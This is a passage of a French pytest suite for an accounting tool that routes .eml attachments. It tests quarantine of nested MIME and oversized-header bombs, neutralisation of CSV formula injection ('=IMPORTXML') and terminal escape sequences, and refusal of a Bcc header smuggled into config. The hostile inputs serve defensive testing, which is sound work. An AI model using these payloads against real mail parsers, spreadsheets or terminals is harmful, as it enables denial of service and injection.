    assert lire_csv(inst.sortie / "file_humaine.csv")[0]["nom_fichier"].startswith("'=IMPORTXML")
    assert lire_csv(inst.sortie / "quarantaine.csv")[0]["nom_fichier"] == "'=bombe.eml"
    (escalade,) = lire_csv(inst.sortie / "escalades.csv")
    assert escalade["libelle"] == "'-2+3*cmd" and escalade["montant"] == "145.00"   # nombre intact


def test_routage_par_domaine_seulement_s_il_est_declare(tmp_path):
    def instance_avec(domaines_alpha: str) -> cycle.ResumeCycle:
        rep = tmp_path / (domaines_alpha or "aucun")
        entree = ecrire_entree(rep / "e")
        with open(entree / "dossiers.csv", "w", newline="", encoding="utf-8") as f:
            w = csv.writer(f)
            w.writerow(["dossier", "raison_sociale", "email_contact", "nom_contact", "jour_echeance_tva",
                        "ton_relance", "circuit", "email_relais", "domaines"])
            for ligne in DOSSIERS:
                w.writerow([*ligne, domaines_alpha if ligne[0] == "ALPHA" else ""])
        inst = nouvelle_instance(rep / "i")
        ecrire_eml(inst.entrant, "1.eml", expediteur="comptable2@alpha-sarl.fr", message_id="<d@a>",
                   corps="120,00 EUR", fichiers=(("loxam_2026-09-03.pdf", b"%PDF"),))
        return lancer(entree, inst, J0), inst

    r, inst = instance_avec("alpha-sarl.fr")
    assert r.propositions == 1
    assert cycle.lister_file(inst)[0].reference_operation == "A-001"
    r, inst = instance_avec("")
    assert r.propositions == 0
    assert cycle.lister_file(inst)[0].motif is MotifNonRoute.DOSSIER_INCONNU


def test_eml_imbrique_mis_en_quarantaine_sans_bloquer_les_autres(entree, inst):
    bombe = _imbrique(1000)
    (inst.entrant / "0-bombe.eml").write_bytes(bombe)
    ecrire_eml(inst.entrant, "1.eml", expediteur="compta@alpha-sarl.fr", message_id="<ok@x>",
               corps="120,00 EUR", fichiers=(("loxam_2026-09-03.pdf", b"%PDF"),))
    r = lancer(entree, inst, J0)
    assert (r.brouillons_crees, r.propositions, r.quarantaine, r.messages_lus) == (2, 1, 1, 1)
    (q,) = lire_csv(inst.sortie / "quarantaine.csv")
    assert q["nom_fichier"] == "0-bombe.eml"
    assert q["empreinte"] == hashlib.sha256(bombe).hexdigest()
    assert "RecursionError" in q["raison"] and "Traceback" not in q["raison"]
    r2 = lancer(entree, inst, J0)                                 # retente, journalise une seule fois
    assert r2.quarantaine == 1 and len(lire_csv(inst.sortie / "quarantaine.csv")) == 1
    assert actions_audit(inst).count("eml_quarantaine") == 1
    assert JournalAudit(inst.audit).verifier().ok
    (inst.entrant / "0-bombe.eml").unlink()                       # retire par un humain
    lancer(entree, inst, J0)
    assert lire_csv(inst.sortie / "quarantaine.csv") == []


def test_journal_tronque_refus_avant_toute_ecriture_puis_reparation(entree, tmp_path, capsys):
    entree1 = ecrire_entree(tmp_path / "e1", operations=[OPERATIONS[0]])
    inst = nouvelle_instance(tmp_path / "i")
    lancer(entree1, inst, J0)
    fragment = b'{"acteur":"systeme","action":"pie'                # coupure pendant une ecriture
    with open(inst.audit, "ab") as f:
        f.write(fragment)
    avant = etat_depot(inst)
    with pytest.raises(cycle.JournalNonSain, match="reparer-audit"):
        lancer(entree, inst, jour(1))                             # 5 nouvelles pieces : aucune ecrite
    b = cycle.brouillons(inst)[0]
    with pytest.raises(cycle.JournalNonSain):
        cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a_10h(jour(1)))
    with pytest.raises(cycle.JournalNonSain):
        cycle.bloquer_piece(inst, "ALPHA", "A-001", VALIDEUSE, motif="x", maintenant=a_10h(jour(1)))
    assert etat_depot(inst) == avant
    assert cycle.exporter(inst, tmp_path / "secours.json").exists()   # lecture toujours possible

    assert cli(capsys, inst, "reparer-audit", "--par", "Mallory", date=jour(1))[0] == 1
    assert inst.audit.read_bytes().endswith(fragment)
    rc, out, _ = cli(capsys, inst, "reparer-audit", "--par", "paul martin", date=jour(1))
    assert rc == 0 and f"{len(fragment)} octet(s)" in out
    (sauvegarde,) = inst.racine.glob("audit.jsonl.fragment-*")
    assert sauvegarde.read_bytes() == fragment
    derniere = JournalAudit(inst.audit).lire()[-1]
    assert (derniere.action, derniere.acteur) == ("journal_repare", "Paul Martin")
    assert derniere.details["octets_retires"] == len(fragment)
    assert derniere.details["fragment"] == sauvegarde.name
    assert cycle.verifier_audit(inst).ok
    rc, out, _ = cli(capsys, inst, "reparer-audit", "--par", RESPONSABLE, date=jour(1))
    assert rc == 0 and "rien a reparer" in out and actions_audit(inst).count("journal_repare") == 1
    assert lancer(entree, inst, jour(1)).pieces_creees == 4


def test_journal_altere_au_milieu_reparation_refusee(entree, inst, capsys):
    lancer(entree, inst, J0)
    lignes = inst.audit.read_bytes().split(b"\n")
    lignes[1] = lignes[1].replace(b"ALPHA", b"ALFA", 1)
    altere = b"\n".join(lignes)
    inst.audit.write_bytes(altere)
    from rapprochement.audit import JournalCorrompu
    with pytest.raises(JournalCorrompu):
        cycle.reparer_audit(inst, RESPONSABLE, maintenant=a_10h(J0))
    rc, _, err = cli(capsys, inst, "reparer-audit", "--par", RESPONSABLE)
    assert rc == 1 and "REFUS (JournalCorrompu)" in err and "reparation refusee" in err
    assert inst.audit.read_bytes() == altere and not list(inst.racine.glob("audit.jsonl.fragment-*"))
    rc, _, err = cli(capsys, inst, "cycle", "--entree", str(entree))
    assert rc == 1 and "JournalNonSain" in err


def test_validateurs_bom_crlf_commentaires(tmp_path):
    inst = nouvelle_instance(tmp_path / "i", validateurs=None)
    inst.validateurs.write_bytes("﻿Marie Durand\r\n\r\n# ancien : Jean\r\n  Paul Martin  \r\n".encode())
    assert cycle.lire_validateurs(inst) == ("Marie Durand", "Paul Martin")
    assert cycle.exiger_validateur(inst, "marie durand") == "Marie Durand"
    with pytest.raises(cycle.ValidateurRefuse):
        cycle.exiger_validateur(inst, "# ancien : Jean")
    inst.validateurs.write_bytes("H\xe9l\xe8ne\n".encode("latin-1"))
    with pytest.raises(cycle.ValidateurRefuse, match="illisible"):
        cycle.exiger_validateur(inst, "Hélène")


def test_cli_neutralise_les_sequences_d_echappement(tmp_path, capsys):
    entree = ecrire_entree(tmp_path / "e", operations=[
        ["ALPHA", "2026-09-03", "CB LOXAM \x1b[2J\x1b]52;c;ZXZpbA==\x07", "120.00", "A-001"]])
    inst = nouvelle_instance(tmp_path / "i")
    e = ecrire_eml(inst.entrant, "1.eml", expediteur="inconnu@evil.example", message_id="<x@y>",
                   fichiers=(("f.pdf", b"%PDF"),))
    e.write_bytes(e.read_bytes().replace(b"Message-ID: <x@y>",
                                         b"Message-ID: \x1b[1A\x1b[2K\x1b[1A\x1b[2Kcache"))
    lancer(entree, inst, J0)
    cycle.bloquer_piece(inst, "ALPHA", "A-001", VALIDEUSE, motif="litige \x1b[31mrouge‮",
                        maintenant=a_10h(J0))
    sorties = []
    for commande in ("file", "pieces"):
        rc, out, err = cli(capsys, inst, commande)
        assert rc == 0
        sorties.append(out + err)
    rc, out, err = cli(capsys, inst, "rattacher", "--message-id", "\x1b[2Kcache", "--par", VALIDEUSE)
    assert rc == 1
    sorties.append(out + err)
    rc, out, err = cli(capsys, inst, "cycle", "--entree", str(entree))
    sorties.append(out + err)
    tout = "".join(sorties)
    assert "\x1b" not in tout and "\x07" not in tout and "‮" not in tout
    assert "cache" in sorties[0] and "\\x1b" in sorties[0]
    assert "litige \\x1b[31mrouge\\u202e" in sorties[1]           # motif visible, inerte


def test_rattacher_leve_le_blocage_du_cycle_jamais_un_blocage_manuel(entree, tmp_path, inst):
    lancer(entree, inst, J0)
    valider_et_envoyer(inst, J0)
    entree2 = ecrire_entree(tmp_path / "e2", pieces=[
        ["P-77", "ALPHA", "orange.pdf", "Orange Pro", "2026-09-15", "59.90", "EUR", "2026-10-06", "email"],
    ])
    lancer(entree2, inst, jour(7))                                # le moteur retrouve A-002 : bloquee
    assert pieces_par_ref(inst)["A-002"].motif_blocage.startswith(cycle.PREFIXE_MOTIF_CYCLE)
    cycle.bloquer_piece(inst, "ALPHA", "A-001", VALIDEUSE, motif="Litige avec le loueur",
                        maintenant=a_10h(jour(7)))
    n = len(JournalAudit(inst.audit).lire())
    m = a_10h(jour(7))

    p = cycle.rattacher_piece(inst, VALIDEUSE, maintenant=m, dossier="ALPHA", reference="A-002",
                              id_piece="P-77")
    assert p.etat is EtatPiece.RECUE and not p.bloquee
    nouvelles = JournalAudit(inst.audit).lire()[n:]
    assert [e.details.get("evenement") for e in nouvelles if e.action == "transition"] == [
        "piece_rattachee", "blocage_leve"]
    assert cycle.controler_piece(inst, "ALPHA", "A-002", VALIDEUSE, conforme=True,
                                 maintenant=m).etat is EtatPiece.VALIDEE

    p = cycle.rattacher_piece(inst, VALIDEUSE, maintenant=m, dossier="ALPHA", reference="A-001",
                              id_piece="P-loxam")
    assert p.etat is EtatPiece.RECUE and p.bloquee and p.motif_blocage == "Litige avec le loueur"
    with pytest.raises(etats.TransitionInterdite, match="bloquee"):
        cycle.controler_piece(inst, "ALPHA", "A-001", VALIDEUSE, conforme=True, maintenant=m)
    cycle.debloquer_piece(inst, "ALPHA", "A-001", "Paul Martin", motif="litige clos", maintenant=m)
    assert cycle.controler_piece(inst, "ALPHA", "A-001", VALIDEUSE, conforme=True,
                                 maintenant=m).etat is EtatPiece.VALIDEE


# ---------------------------------------------------------------------------
# Gardes de taille avant analyse d'un .eml, et entrees malformees
# ---------------------------------------------------------------------------


def _eml_avec_from(taille_en_tete: int, message_id: str) -> bytes:
    mots = b"=?utf-8?q?a?= " * (taille_en_tete // 14)
    return (b"From: " + mots + b"<a@b.fr>\r\nMessage-ID: <" + message_id.encode()
            + b">\r\n\r\nx\r\n")


def test_eml_gros_corps_en_tetes_normaux_passe(entree, inst):
    e = ecrire_eml(inst.entrant, "1.eml", expediteur="compta@alpha-sarl.fr", message_id="<g@a>",
                   corps="120,00 EUR\n" + "texte de remplissage " * 5000,
                   fichiers=(("loxam_2026-09-03.pdf", b"%PDF" + b"0" * 100_000),))
    assert e.stat().st_size > 100_000
    r = lancer(entree, inst, J0)
    assert (r.propositions, r.quarantaine) == (1, 0)


def test_bloc_d_en_tetes_de_70_kio_en_quarantaine_sans_analyse(entree, inst, monkeypatch):
    brut = _eml_avec_from(70 * 1024, "lourd@x")
    assert brut.index(b"\r\n\r\n") > cycle.TAILLE_MAX_EN_TETES_EML
    (inst.entrant / "lourd.eml").write_bytes(brut)
    ecrire_eml(inst.entrant, "ok.eml", expediteur="compta@alpha-sarl.fr", message_id="<ok@a>",
               corps="120,00 EUR", fichiers=(("loxam_2026-09-03.pdf", b"%PDF"),))
    analyses = []                                                 # cote parent : appels d'analyse
    original = cycle._lire_eml_isole
    monkeypatch.setattr(cycle, "_lire_eml_isole", lambda chemin, *a: analyses.append(chemin.name)
                        or original(chemin, *a))
    t = time.perf_counter()
    r = lancer(entree, inst, J0)
    duree = time.perf_counter() - t
    assert duree < 1.0, duree
    assert analyses == ["ok.eml"]                                 # l'analyseur n'a jamais vu le fichier
    assert (r.quarantaine, r.propositions) == (1, 1)
    (q,) = lire_csv(inst.sortie / "quarantaine.csv")
    assert q["nom_fichier"] == "lourd.eml" and q["empreinte"] == hashlib.sha256(brut).hexdigest()
    assert q["raison"].startswith("EmlRefuse : bloc d'en-tetes de") and "Traceback" not in q["raison"]
    assert actions_audit(inst).count("eml_quarantaine") == 1


def test_bloc_d_en_tetes_juste_sous_le_seuil_analyse(entree, inst):
    (inst.entrant / "limite.eml").write_bytes(_eml_avec_from(32 * 1024, "limite@x"))
    r = lancer(entree, inst, J0)
    assert r.quarantaine == 0 and r.messages_lus == 1


def test_fichier_de_31_mio_refuse_sans_analyse(entree, inst, monkeypatch):
    gros = inst.entrant / "gros.eml"
    with open(gros, "wb") as f:
        f.write(b"From: a@b.fr\r\nMessage-ID: <gros@x>\r\n\r\n")
        f.truncate(31 * 1024 * 1024)
    monkeypatch.setattr(cycle, "_lire_eml_isole", lambda *a: pytest.fail("analyse interdite"))
    r = lancer(entree, inst, J0)
    (q,) = lire_csv(inst.sortie / "quarantaine.csv")
    assert r.quarantaine == 1 and q["raison"].startswith("EmlRefuse : fichier de 32505856 octets")


@pytest.mark.parametrize("domaines", ["client a.fr", "jean@client-a.fr", "localhost"])
def test_domaines_malformes_refus_lisible_sans_ecriture(tmp_path, capsys, domaines):
    entree = ecrire_entree(tmp_path / "e")
    with open(entree / "dossiers.csv", "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["dossier", "raison_sociale", "email_contact", "nom_contact", "jour_echeance_tva",
                    "ton_relance", "circuit", "email_relais", "domaines"])
        w.writerow([*DOSSIERS[0], domaines])
    inst = cycle.Instance(tmp_path / "i")                         # instance neuve, rien sur disque
    rc, out, err = cli(capsys, inst, "cycle", "--entree", str(entree))
    assert rc == 1
    assert "REFUS [cycle]" in err and "domaine" in err and "dossiers.csv" in err
    assert not inst.depot.exists() and not inst.audit.exists()


def test_entrees_illisibles_refus_lisible(tmp_path, capsys, inst):
    entree = ecrire_entree(tmp_path / "e")
    lancer(entree, inst, J0)
    avant, audit_avant = etat_depot(inst), inst.audit.read_bytes()
    (entree / "releve_bancaire.csv").write_text(
        "dossier,date_operation,libelle,debit,credit,reference\nALPHA,31/02/2026,\x1b[2J,1,,R\n",
        encoding="utf-8")
    rc, _, err = cli(capsys, inst, "cycle", "--entree", str(entree))
    assert rc == 1 and "REFUS [cycle]" in err and "releve_bancaire.csv" in err and "\x1b" not in err
    (entree / "releve_bancaire.csv").unlink()
    rc, _, err = cli(capsys, inst, "cycle", "--entree", str(entree))
    assert rc == 1 and "introuvable" in err
    assert etat_depot(inst) == avant and inst.audit.read_bytes() == audit_avant


# ---------------------------------------------------------------------------
# Lecture isolee des .eml dans un processus enfant borne
# ---------------------------------------------------------------------------

import multiprocessing  # noqa: E402
try:
    import resource  # noqa: E402  (POSIX seulement : absent sous Windows)
except ImportError:                                     # pragma: no cover - Windows
    resource = None

posix_seulement = pytest.mark.skipif(
    sys.platform == "win32", reason="isolation par fork et limites rlimit : POSIX seulement")

MEMOIRE_TEST = 256 * 1024 ** 2
CPU_TEST = 2


def _mots(n: int) -> bytes:
    return b"=?utf-8?q?a?= " * n


def _partie_nom_encode(n: int, mid: str) -> bytes:
    return (b"From: inconnu@evil.example\r\nMessage-ID: <" + mid.encode() + b">\r\nMIME-Version: 1.0\r\n"
            b"Content-Type: multipart/mixed; boundary=b\r\n\r\n--b\r\n"
            b"Content-Type: application/pdf; name=\"" + _mots(n).strip() + b"\"\r\n\r\nPDF\r\n--b--\r\n")


def _enfants_vivants() -> list[str]:
    """Processus enfants encore vivants, hors `resource_tracker` : assistant POSIX de
    `multiprocessing` (demarre par le contexte spawn, absent sous Windows), qui s'arrete
    avec le parent et ne lit aucun e-mail."""
    from multiprocessing import resource_tracker
    assistant = str(getattr(resource_tracker._resource_tracker, "_pid", None))
    vivants = [str(p.pid) for p in multiprocessing.active_children()]
    for fichier in Path("/proc/self/task").glob("*/children"):
        vivants += fichier.read_text().split()
    return [pid for pid in vivants if pid != assistant]


def _rss_parent_ko() -> int:
    return resource.getrusage(resource.RUSAGE_SELF).ru_maxrss if resource else 0


def lancer_borne(entree: Path, inst: cycle.Instance, d: dt.date = J0) -> cycle.ResumeCycle:
    return cycle.executer_cycle(entree, inst, d, a_10h(d), limite_memoire_eml=MEMOIRE_TEST,
                                limite_cpu_eml=CPU_TEST)


@posix_seulement
def test_attaques_mesurees_en_quarantaine_le_reste_du_lot_traite(entree, inst):
    attaques = {
        "a-partie-109k.eml": _partie_nom_encode(8000, "p109@x"),
        "b-partie-218k.eml": _partie_nom_encode(16000, "p218@x"),
        "c-imbrique-1000.eml": _imbrique(1000),
    }
    for nom, brut in attaques.items():
        (inst.entrant / nom).write_bytes(brut)
    ecrire_eml(inst.entrant, "y-ok.eml", expediteur="compta@alpha-sarl.fr", message_id="<ok@a>",
               corps="Montant 120,00 EUR",
               fichiers=(("loxam_2026-09-03.pdf", b"%PDF-1"), ("annexe.pdf", b"%PDF-2"),
                         ("photo.jpg", b"\xff\xd8\xff")))                 # legitime, 3 pieces jointes
    ecrire_eml(inst.entrant, "z-ok.eml", expediteur="contact@beta-sas.fr", message_id="<ok@b>",
               fichiers=(("metro.pdf", b"%PDF-3"),))
    rss_avant = _rss_parent_ko()
    t = time.perf_counter()
    r = lancer_borne(entree, inst)
    duree = time.perf_counter() - t
    assert duree < 8.0, duree
    assert _rss_parent_ko() - rss_avant < 100 * 1024                 # < 100 Mo (sans isolation : +465 Mo a +1,8 Go)
    quarantaine = {q["nom_fichier"]: q["raison"] for q in lire_csv(inst.sortie / "quarantaine.csv")}
    assert set(quarantaine) == set(attaques)
    assert "MemoryError" in quarantaine["a-partie-109k.eml"]
    assert "RecursionError" in quarantaine["c-imbrique-1000.eml"]
    assert all("Traceback" not in raison for raison in quarantaine.values())
    assert r.messages_lus == 2 and r.propositions == 1 and r.brouillons_crees == 2
    file = cycle.lister_file(inst)
    assert len([d for d in file if d.message_id == "<ok@a>"]) == 3   # une decision par piece jointe
    assert _enfants_vivants() == []


@pytest.mark.parametrize("n", [8000, 16000])                         # 112 Ko puis 224 Ko
@posix_seulement
def test_from_quadratique_borne_meme_sans_le_premier_filtre(entree, inst, monkeypatch, n):
    monkeypatch.setattr(cycle, "TAILLE_MAX_EN_TETES_EML", 10 * 1024 * 1024)   # 2e ligne de defense seule
    (inst.entrant / "lourd.eml").write_bytes(
        b"From: " + _mots(n) + b"<a@b.fr>\r\nMessage-ID: <lourd@x>\r\n\r\nx\r\n")
    ecrire_eml(inst.entrant, "ok.eml", expediteur="compta@alpha-sarl.fr", message_id="<ok@a>",
               corps="120,00 EUR", fichiers=(("loxam_2026-09-03.pdf", b"%PDF"),))
    rss_avant = _rss_parent_ko()
    t = time.perf_counter()
    r = lancer_borne(entree, inst)
    assert time.perf_counter() - t < 5.0
    assert _rss_parent_ko() - rss_avant < 100 * 1024
    assert r.propositions == 1
    lourd = [d for d in cycle.lister_file(inst) if d.message_id == "<lourd@x>"]
    en_quarantaine = [q for q in lire_csv(inst.sortie / "quarantaine.csv") if q["nom_fichier"] == "lourd.eml"]
    assert en_quarantaine or (lourd and all(d.dossier is None for d in lourd))   # jamais route
    assert _enfants_vivants() == []


@pytest.mark.xfail(strict=True, reason=(
    "routage._expediteur intercepte `Exception`, donc aussi MemoryError : sous la borne memoire "
    "de la lecture isolee, l'en-tete From quadratique n'est pas mis en quarantaine mais lu comme "
    "un expediteur vide (DOSSIER_INCONNU, file humaine). Sans danger pour le routage, mais "
    "l'epuisement de ressources est deguise en en-tete malforme."))
@posix_seulement
def test_defaut_routage_avale_memoryerror_de_l_en_tete_from(entree, inst, monkeypatch):
    monkeypatch.setattr(cycle, "TAILLE_MAX_EN_TETES_EML", 10 * 1024 * 1024)
    (inst.entrant / "lourd.eml").write_bytes(
        b"From: " + _mots(8000) + b"<a@b.fr>\r\nMessage-ID: <lourd@x>\r\n\r\nx\r\n")
    lancer_borne(entree, inst)
    assert [q["nom_fichier"] for q in lire_csv(inst.sortie / "quarantaine.csv")] == ["lourd.eml"]


@pytest.mark.parametrize("comportement, attendu", [
    ("boucle", "SIGXCPU"),
    ("sommeil", "interrompue"),
    ("memoire", "MemoryError"),
    ("sortie", "code de sortie 3"),
])
@posix_seulement
def test_lecture_isolee_chaque_echec_devient_une_quarantaine(entree, inst, monkeypatch,
                                                           comportement, attendu):
    from rapprochement import routage

    def lecteur_hostile(chemin):
        if comportement == "boucle":
            while True:
                pass
        if comportement == "sommeil":
            time.sleep(60)
        if comportement == "memoire":
            return bytearray(4 * 1024 ** 3)
        os._exit(3)

    # Une boucle est arretee par la limite de TEMPS CPU (1 s) : sur une machine saturee l'enfant
    # n'obtient qu'une fraction du processeur, donc le delai de garde en temps REEL doit rester
    # tres superieur (sinon il tuerait l'enfant avant SIGXCPU et le test dependrait de la charge).
    # Les autres comportements ne consomment pas de CPU : delai serre, test rapide.
    marge = 8.0 if comportement == "boucle" else 0.5
    monkeypatch.setattr(cycle, "MARGE_GARDE_LECTURE_EML", marge)
    monkeypatch.setattr(routage, "lire_eml", lecteur_hostile)      # herite par l'enfant (fork)
    ecrire_eml(inst.entrant, "1.eml", expediteur="compta@alpha-sarl.fr", message_id="<h@a>",
               fichiers=(("f.pdf", b"%PDF"),))
    t = time.perf_counter()
    r = cycle.executer_cycle(entree, inst, J0, a_10h(J0), limite_memoire_eml=MEMOIRE_TEST,
                             limite_cpu_eml=1)
    assert time.perf_counter() - t < (20.0 if comportement == "boucle" else 4.0)
    (q,) = lire_csv(inst.sortie / "quarantaine.csv")
    assert attendu in q["raison"] and "Traceback" not in q["raison"], q["raison"]
    assert r.quarantaine == 1 and r.brouillons_crees == 2
    assert _enfants_vivants() == []


@pytest.mark.isolation_reelle
def test_sans_module_resource_refus_explicite(entree, inst, monkeypatch, capsys):
    monkeypatch.setattr(cycle, "resource", None)
    with pytest.raises(cycle.IsolationIndisponible, match="Linux ou macOS"):
        lancer(entree, inst, J0)
    assert not inst.depot.exists()
    rc, _, err = cli(capsys, inst, "cycle", "--entree", str(entree))
    assert rc == 1 and "IsolationIndisponible" in err and "Linux ou macOS" in err


# ---------------------------------------------------------------------------
# Mode test, strategies d'isolation (fork / spawn / directe), ExpediteurTest, console
# ---------------------------------------------------------------------------

ADRESSE_TEST = "test@exemple.invalid"
ORIGINE = "compta@alpha-sarl.fr"


def ecrire_config(inst: cycle.Instance, contenu: object = None, **valeurs: object) -> Path:
    texte = contenu if isinstance(contenu, (str, bytes)) else json.dumps(valeurs)
    chemin = inst.racine / "config.json"
    chemin.write_bytes(texte if isinstance(texte, bytes) else texte.encode("utf-8"))
    return chemin


def faire_plateforme_sans_fork(monkeypatch) -> None:
    """Simule Windows : ni le module `resource`, ni le demarrage `fork`."""
    monkeypatch.setattr(cycle, "resource", None)
    monkeypatch.setattr(cycle.multiprocessing, "get_all_start_methods", lambda: ["spawn"])


def deposer_emls(inst: cycle.Instance) -> None:
    """Trois messages : une proposition, un sans piece jointe, un inconnu."""
    ecrire_eml(inst.entrant, "1.eml", expediteur=ORIGINE, message_id="<a@a>", corps="120,00 EUR",
               fichiers=(("loxam_2026-09-03.pdf", b"%PDF-1"),))
    ecrire_eml(inst.entrant, "2.eml", expediteur=ORIGINE, message_id="<b@a>", corps="bientot")
    ecrire_eml(inst.entrant, "3.eml", expediteur="inconnu@gmail.com", message_id="<c@x>",
               fichiers=(("x.pdf", b"%PDF-2"),))


def test_charger_config_defauts_et_validation(tmp_path):
    inst = nouvelle_instance(tmp_path / "i")
    assert cycle.charger_config(inst) == {"mode_test": False, "adresse_test": ADRESSE_TEST}
    assert not (inst.racine / "config.json").exists()                  # lecture seule
    assert cycle.charger_config(tmp_path / "inexistante") == cycle.charger_config(inst)
    ecrire_config(inst, b"\xef\xbb\xbf" + json.dumps({"mode_test": True, "port": 8080}).encode())
    config = cycle.charger_config(inst)                                 # BOM accepte, cle inconnue gardee
    assert config == {"mode_test": True, "adresse_test": ADRESSE_TEST, "port": 8080}
    ecrire_config(inst, mode_test=True, adresse_test="moi@exemple.invalid")
    assert cycle.charger_config(inst)["adresse_test"] == "moi@exemple.invalid"
    for contenu, attendu in [
        ('{"mode_test": true,', "ligne 1"),                             # JSON invalide
        ("[]", "objet JSON"),
        ('{"mode_test": "false"}', "booleen"),                          # jamais "false" lu comme vrai
        ('{"mode_test": 1}', "booleen"),
        ('{"mode_test": true, "adresse_test": "deux mots@x"}', "adresse_test"),
        ('{"mode_test": true, "adresse_test": 12}', "adresse_test"),
        ('{"mode_test": true, "adresse_test": "a@b.fr\\nBcc: c@d.fr"}', "adresse_test"),
        (b'{"mode_test": true, "x": "\xe9"}', "UTF-8"),
    ]:
        ecrire_config(inst, contenu)
        with pytest.raises(cycle.ConfigInvalide, match=attendu) as exc:
            cycle.charger_config(inst)
        assert "Traceback" not in str(exc.value) and "\n" not in str(exc.value)


def test_mode_normal_aucune_trace_du_mode_test(entree, inst):
    r = lancer(entree, inst, J0)
    assert not r.mode_test and r.avertissements == [] and r.strategie_isolation == "fork"
    assert r.texte().splitlines()[0] == "Cycle du 2026-10-05"
    assert (inst.sortie / "resume.txt").read_text().splitlines()[0] == "Cycle du 2026-10-05"
    assert "mode_test_actif" not in actions_audit(inst) and "isolation_degradee" not in actions_audit(inst)


def test_mode_test_config_visible_partout_et_journalise_une_fois_par_cycle(entree, inst):
    ecrire_config(inst, mode_test=True)
    r = lancer(entree, inst, J0)
    banniere = f"*** MODE TEST ACTIF : tout e-mail part vers {ADRESSE_TEST}, jamais vers un client."
    assert r.texte().splitlines()[0].startswith(banniere)
    assert (inst.sortie / "resume.txt").read_text().splitlines()[0].startswith(banniere)
    assert "isolation_degradee" not in actions_audit(inst)             # fork : pas de degradation
    lancer(entree, inst, J0)
    assert actions_audit(inst).count("mode_test_actif") == 2           # une fois PAR cycle
    (premier, *_) = [e for e in JournalAudit(inst.audit).lire() if e.action == "mode_test_actif"]
    assert premier.details == {"adresse_test": ADRESSE_TEST, "source": "config.json"}
    cycle_termine = [e for e in JournalAudit(inst.audit).lire() if e.action == "cycle_termine"][-1]
    assert cycle_termine.details["mode_test"] is True and cycle_termine.details["strategie_isolation"] == "fork"
    assert JournalAudit(inst.audit).verifier().ok


def test_mode_test_drapeau_cli_et_config_invalide_refusee_sans_rien_ecrire(entree, tmp_path, capsys):
    inst = cycle.Instance(tmp_path / "neuve")
    rc, out, _ = cli(capsys, inst, "cycle", "--entree", str(entree), "--mode-test")
    assert rc == 0 and out.startswith("*** MODE TEST ACTIF")
    (source,) = [e for e in JournalAudit(inst.audit).lire() if e.action == "mode_test_actif"]
    assert source.details["source"] == "--mode-test"
    ecrire_config(inst, mode_test=True)
    lancer(entree, inst, jour(1))
    assert [e.details["source"] for e in JournalAudit(inst.audit).lire()
            if e.action == "mode_test_actif"] == ["--mode-test", "config.json"]
    # config invalide : refus lisible, avant toute ecriture (instance non creee)
    jamais = cycle.Instance(tmp_path / "jamais")
    jamais.racine.mkdir()
    ecrire_config(jamais, '{"mode_test": tru')
    rc, _, err = cli(capsys, jamais, "cycle", "--entree", str(entree))
    assert rc == 1 and "REFUS (ConfigInvalide)" in err and "config.json invalide" in err
    assert sorted(p.name for p in jamais.racine.iterdir()) == ["config.json"]
    rc, _, err = cli(capsys, jamais, "envoyer", "abc", "--par", VALIDEUSE)
    assert rc == 1 and "ConfigInvalide" in err


@pytest.mark.parametrize("fork_dispo, mode_test, demandee, attendu", [
    (True, False, None, "fork"),
    (True, True, None, "fork"),
    (True, False, "fork", "fork"),
    (True, True, "spawn", "spawn"),
    (True, True, "directe", "directe"),
    (True, False, "spawn", cycle.IsolationIndisponible),             # plus faible : jamais hors mode test
    (True, False, "directe", cycle.IsolationIndisponible),
    (False, False, None, cycle.IsolationIndisponible),               # Windows hors mode test : refus
    (False, False, "fork", cycle.IsolationIndisponible),
    (False, True, None, "spawn"),                                    # Windows en mode test : spawn
    (False, True, "fork", cycle.IsolationIndisponible),
    (False, True, "directe", "directe"),
    (True, True, "bidon", cycle.ErreurCycle),
])
@pytest.mark.isolation_reelle
def test_choix_de_la_strategie_d_isolation(monkeypatch, fork_dispo, mode_test, demandee, attendu):
    if not fork_dispo:
        faire_plateforme_sans_fork(monkeypatch)
    if isinstance(attendu, str):
        assert cycle.choisir_strategie_isolation(mode_test, demandee) == attendu
    else:
        with pytest.raises(attendu) as exc:
            cycle.choisir_strategie_isolation(mode_test, demandee)
        if not mode_test and attendu is cycle.IsolationIndisponible:
            assert "utilisez --mode-test pour un essai local" in str(exc.value)
        if not fork_dispo and demandee in (None, "fork"):
            assert "Linux ou macOS" in str(exc.value)


@pytest.mark.isolation_reelle
def test_windows_hors_mode_test_refus_avant_toute_ecriture(entree, tmp_path, monkeypatch, capsys):
    faire_plateforme_sans_fork(monkeypatch)
    racine = tmp_path / "jamais"
    with pytest.raises(cycle.IsolationIndisponible, match="utilisez --mode-test pour un essai local"):
        cycle.executer_cycle(entree, racine, J0, a_10h(J0))
    assert not racine.exists()
    rc, _, err = cli(capsys, cycle.Instance(racine), "cycle", "--entree", str(entree))
    assert rc == 1 and "utilisez --mode-test pour un essai local" in err and not racine.exists()


def test_windows_en_mode_test_spawn_avec_avertissement_visible_partout(entree, tmp_path, monkeypatch, capsys):
    reference = nouvelle_instance(tmp_path / "fork")
    deposer_emls(reference)
    lancer(entree, reference, J0, mode_test=True)                      # reference : fork
    faire_plateforme_sans_fork(monkeypatch)
    inst = nouvelle_instance(tmp_path / "windows")
    deposer_emls(inst)
    rc, out, _ = cli(capsys, inst, "cycle", "--entree", str(entree), "--mode-test")
    assert rc == 0
    ligne = "AVERTISSEMENT : isolation partielle : temps seulement, pas de limite memoire"
    assert ligne in out.splitlines() and out.splitlines()[0].startswith("*** MODE TEST ACTIF")
    assert ligne in (inst.sortie / "resume.txt").read_text().splitlines()
    (degradee,) = [e for e in JournalAudit(inst.audit).lire() if e.action == "isolation_degradee"]
    assert degradee.acteur == "systeme" and degradee.details["strategie"] == "spawn"
    assert degradee.details["niveau"] == "partielle" and "limite memoire" in degradee.details["avertissement"]
    assert "strategie_isolation                : spawn" not in out    # affichee par le bandeau, pas en double
    cd = [e for e in JournalAudit(inst.audit).lire() if e.action == "cycle_termine"][-1].details
    assert cd["strategie_isolation"] == "spawn" and cd["messages_lus"] == 3 and cd["quarantaine"] == 0
    # Memes resultats que sous fork : seule la facon de lire change.
    for nom in ("file_humaine.csv", "pieces_attendues.csv", "a_verifier.csv", "quarantaine.csv",
                "tableau_suivi.csv", "periodes.csv", "escalades.csv"):
        assert (inst.sortie / nom).read_bytes() == (reference.sortie / nom).read_bytes(), nom
    assert _enfants_vivants() == []


@pytest.mark.isolation_reelle
